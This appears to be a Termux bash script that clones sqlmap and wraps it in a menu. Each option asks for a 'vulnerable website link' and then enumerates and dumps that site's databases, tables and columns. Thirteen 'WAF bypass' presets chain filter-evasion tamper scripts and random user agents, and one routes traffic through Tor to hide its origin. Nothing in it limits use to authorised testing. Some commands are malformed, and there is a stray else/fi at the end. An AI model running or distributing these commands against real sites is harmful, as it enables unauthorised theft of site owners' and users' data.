#!/data/data/com.termux/files/usr/bin/bash
git clone https://github.com/sqlmapproject/sqlmap
cp logo.sh sqlmap
cd sqlmap
sh logo.sh
echo ""
PS3='Please enter your choice: '
options=("Normal injection" "Waf bypass 1" "Waf bypass 2" "Waf bypass 3" "Waf bypass 4" "Waf bypass 5" "Waf bypass 6" "Waf bypass 7" "Waf bypass 8" "Waf bypass 9" "Waf bypass 10" "Waf bypass 11" "Waf bypass 12" "Waf bypass 13" "Wizard mode" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Normal injection")
    echo "Enter vulnerable website link :"
    read site
    python2 sqlmap.py -u $site --dbs
    echo "Enter the name of the database you got from sqlmap"
    read db
    python2 sqlmap.py -u $site -D $db --tables
    echo "enter the table to view its columns"
    read tb
    python2 sqlmap.py -u $site -D $db -T $tb --columns
    echo "Enter the column to dump data use , (comma) for multiple columns :"
    read col
    python2 sqlmap.py -u $site -D $db -T $tb -C $col --dump
            ;;
        "Waf bypass 1")
            echo "Enter vulnerable website link :"
            read site
            python2 sqlmap.py -u "$site" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            python2 sqlmap.py -u "$site" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 -D $db --tables
            echo "enter the table to view its columns"
            read tb
            python2 sqlmap.py -u "$site" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            python2 sqlmap.py -u "$site" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 -D $db -T $tb -C $col --dump
            ;;
        "Waf bypass 2")
            echo "Enter vulnerable website link :"
            read site
            python2 sqlmap.py -u "$site" --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            python2 sqlmap.py -u "$site" --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" -D $db --tables
            echo "enter the table to view its columns"
            read tb
            python2 sqlmap.py -u "$site" --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            python2 sqlmap.py -u "$site" --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" -D $db -T $tb -C $col --dump
            ;;
            "Waf bypass 3")
            echo "Enter vulnerable website link :"
            read site
            python2 sqlmap.py -u "$site" --dbms="MySQL" -v3 --technique U --tamper="space2comment" --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            python2 sqlmap.py -u "$site" --dbms="MySQL" -v3 --technique U --tamper="space2comment" -D $db --tables
            echo "enter the table to view its columns"
            read tb
            python2 sqlmap.py -u "$site" --dbms="MySQL" -v3 --technique U --tamper="space2comment" -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            python2 sqlmap.py -u "$site" --dbms="MySQL" -v3 --technique U --tamper="space2comment"  -D $db -T $tb -C $col --dump
            ;;
            "Waf bypass 4")
            echo "Enter vulnerable website link :"
            read site
            python2 sqlmap.py -u "$site" -v3 --technique=T --no-cast --fresh-queries --banner --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            python2 sqlmap.py -u "$site" -v3 --technique=T --no-cast --fresh-queries --banner -D $db --tables
            echo "enter the table to view its columns"
            read tb
            python2 sqlmap.py -u "$site" -v3 --technique=T --no-cast --fresh-queries --banner -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            python2 sqlmap.py -u "$site" -v3 --technique=T --no-cast --fresh-queries --banner -D $db -T $tb -C $col --dump
            ;;
            "Waf bypass 5")
            echo "Enter vulnerable website link :"
            read site
            python2 sqlmap.py -u "$site" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            python2 sqlmap.py -u "$site" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" -D $db --tables
            echo "enter the table to view its columns"
            read tb
            python2 sqlmap.py -u "$site" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            python2 sqlmap.py -u "$site" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" -D $db -T $tb -C $col --dump
            ;;
            "Waf bypass 6")
            echo "Enter vulnerable website link :"
            read site
            python2 sqlmap.py -u "$site" --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3 --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            python2 sqlmap.py -u "$site" --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3 -D $db --tables
            echo "enter the table to view its columns"
            read tb
            python2 sqlmap.py -u "$site" --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3 -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            python2 sqlmap.py -u "$site" --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3 -D $db -T $tb -C $col --dump
            ;;
            "Waf bypass 7")
            echo "Enter vulnerable website link :"
            read site
            python2 sqlmap.py -u "$site" --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            python2 sqlmap.py -u "$site" --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent -D $db --tables
            echo "enter the table to view its columns"
            read tb
            python2 sqlmap.py -u "$site" --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            python2 sqlmap.py -u "$site" --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent -D $db -T $tb -C $col --dump
            ;;
            "Waf bypass 8")
            echo "Enter vulnerable website link :"
            read site
            python2 sqlmap.py -u "$site" --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2 --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            python2 sqlmap.py -u "$site" --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2 -D $db --tables
            echo "enter the table to view its columns"
            read tb
            python2 sqlmap.py -u "$site" --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2 -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            python2 sqlmap.py -u "$site" --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2 -D $db -T $tb -C $col --dump
            ;;
            "Waf bypass 9")
            echo "Enter vulnerable website link :"
            read site
            python2 sqlmap.py -u "$site" --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            python2 sqlmap.py -u "$site" --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db --tables
            echo "enter the table to view its columns"
            read tb
            python2 sqlmap.py -u "$site" --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            python2 sqlmap.py -u "$site" --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db -T $tb -C $col --dump
            ;;
            "Waf bypass 10")
            echo "Enter vulnerable website link :"
            read site
            python2 sqlmap.py -u "$site" --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            python2 sqlmap.py -u "$site" --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql -D $db --tables
            echo "enter the table to view its columns"
            read tb
            python2 sqlmap.py -u "$site" --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            python2 sqlmap.py -u "$site" --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql -D $db -T $tb -C $col --dump
            ;;
            "Waf bypass 11")
            echo "Enter vulnerable website link :"
            read site
            python2 sqlmap.py -u "$site" --level 5 --risk 3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            python2 sqlmap.py -u "$site" --level 5 --risk 3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db --tables
            echo "enter the table to view its columns"
            read tb
            python2 sqlmap.py -u "$site" --level 5 --risk 3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            python2 sqlmap.py -u "$site" --level 5 --risk 3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db -T $tb -C $col --dump
            ;;
            "Waf bypass 12")
            echo "Enter vulnerable website link :"
            read site
            python2 sqlmap.py -u "$site" --level=5 --risk=3 -p "id" –-tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords" --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            python2 sqlmap.py -u "$site" --level=5 --risk=3 -p "id" –-tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords" -D $db --tables
            echo "enter the table to view its columns"
            read tb
            python2 sqlmap.py -u "$site" --level=5 --risk=3 -p "id" –-tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords" -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            python2 sqlmap.py -u "$site" --level=5 --risk=3 -p "id" –-tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords" -D $db -T $tb -C $col --dump
            ;;
            "Waf bypass 13")
            echo "Enter vulnerable website link :"
            read site
            python2 sqlmap.py -u "$site" --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            python2 sqlmap.py -u "$site" --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D $db --tables
            echo "enter the table to view its columns"
            read tb
            python2 sqlmap.py -u "$site" --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            python2 sqlmap.py -u "$site" --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D $db -T $tb -C $col --dump
            ;;
            "Wizard mode")
            cd sqlmap
            python2 sqlmap.py --wizard
            ;;
        "Quit")
        echo "Thankyou for using my tool :)"
        echo "Yell Phone Naing"
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done	
else 
echo "Dude you are drunk !! select a valid option mate"
fi
